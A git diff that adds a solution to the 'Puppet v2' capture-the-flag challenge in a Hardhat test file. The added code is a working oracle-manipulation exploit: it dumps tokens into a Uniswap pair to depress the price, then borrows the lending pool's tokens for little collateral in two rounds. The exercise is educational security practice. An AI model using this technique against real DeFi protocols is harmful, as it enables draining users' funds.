@@ -4,7 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -55,7 +55,7 @@ describe('[Challenge] Puppet v2', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        uniswapExchange = await UniswapPairFactory.attach(
+        uniswapExchange = UniswapPairFactory.attach(
             await uniswapFactory.getPair(token.address, weth.address)
         );
         expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
@@ -83,6 +83,69 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // swap the 1st time
+        await token.connect(player).approve(
+            uniswapRouter.address,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await time.latest()) + 500
+        );
+
+        // borrow the 1st time
+        let depositETH = 15n * 10n ** 18n;
+        await weth.connect(player).deposit({ value: depositETH });
+        await weth.connect(player).approve(
+            lendingPool.address,
+            depositETH
+        );
+        // ensure that we have enough WETH to borrow tokens
+        expect(
+            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE / 2n)
+        ).to.lt(await weth.balanceOf(player.address));
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE / 2n);
+
+        // use the borrowed token to swap for more ETH
+        await token.connect(player).approve(
+            uniswapRouter.address,
+            POOL_INITIAL_TOKEN_BALANCE / 2n
+        );
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            POOL_INITIAL_TOKEN_BALANCE / 2n,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await time.latest()) + 500
+        );
+
+        // borrow the 2nd time
+        depositETH = 15n * 10n ** 16n;
+        await weth.connect(player).deposit({ value: depositETH });
+        await weth.connect(player).approve(
+            lendingPool.address,
+            depositETH
+        );
+        expect(
+            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE / 2n)
+        ).to.lt(await weth.balanceOf(player.address));
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE / 2n);
+
+        // withdraw all weth and swap some ETH to tokens
+        await weth.connect(player).withdraw(
+            await weth.balanceOf(player.address)
+        );
+        await uniswapRouter.connect(player).swapExactETHForTokens(
+            0,
+            [weth.address, token.address],
+            player.address,
+            (await time.latest()) + 500,
+            { value: 10n * 10n ** 18n }
+        );
     });
 
     after(async function () {
